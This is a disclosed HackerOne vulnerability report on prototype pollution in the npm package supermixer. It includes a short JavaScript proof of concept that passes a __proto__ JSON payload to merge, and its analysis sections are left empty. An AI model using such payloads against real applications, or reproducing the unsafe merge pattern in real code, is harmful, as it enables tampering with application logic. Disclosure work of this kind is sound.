---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '959987'
original_report_id: '959987'
title: '[supermixer] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-08-16T18:25:28.119Z'
disclosed_at: '2020-08-20T11:10:40.365Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [supermixer] Prototype pollution

## Metadata

- HackerOne Report ID: 959987
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-20T11:10:40.365Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Prototype pollution in supermixer, It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation.

# Module

**module name:** supermixer
**version:** 1.0.3
**npm page:** `https://www.npmjs.com/package/supermixer`

## Module Description

Mixes/merges/extends your object in multiple ways.

Unlike underscore/lodash utility methods this module allows you to:

* mix or deep merge objects' prototype chain. Regular mixin/extend/assign implementations can't do that.
* mix or deep merge unique properties only. I.e. data will not be overwritten if a property already exists.
* filter each individual property by target value, source value, and key. See API.
*  transform each value by resulting value, source value, and key. See API.

## Module Stats

[577] weekly downloads

# Vulnerability

## Vulnerability Description

Prototype Pollution is a vulnerability affecting JavaScript, Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.

## Steps To Reproduce:

```javascript
var mixer = require('supermixer');
var payload = '{"__proto__":{"poc":"evil"}}';
var test = {};
console.log("Before: ", test.poc);
mixer.merge({},JSON.parse(payload));
console.log("After: ", test.poc);
```

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

DoS, Access to restricted data, rce (**depends on implementation**)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
